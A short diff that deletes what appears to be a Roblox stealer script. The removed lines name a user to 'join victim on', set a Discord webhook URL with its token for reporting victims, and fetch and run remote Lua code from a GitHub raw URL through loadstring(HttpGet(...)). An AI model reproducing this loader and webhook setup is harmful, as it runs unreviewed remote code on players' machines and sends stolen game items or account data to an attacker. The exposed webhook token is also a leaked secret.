@@ -1,6 +1,1 @@
-_G.Username = "Sellyelpro" -- user you should join victim on
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1339647940372729958/tSrxGUDBZA9c8R9u6DFWi9RRs0rkPvSRq1YlN3MfBWnQpBmGfyuE9moYFp7XFNHZWayj" -- change to your webhook
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/54a3de4d4e4ae52ae46d2061.lua'))()
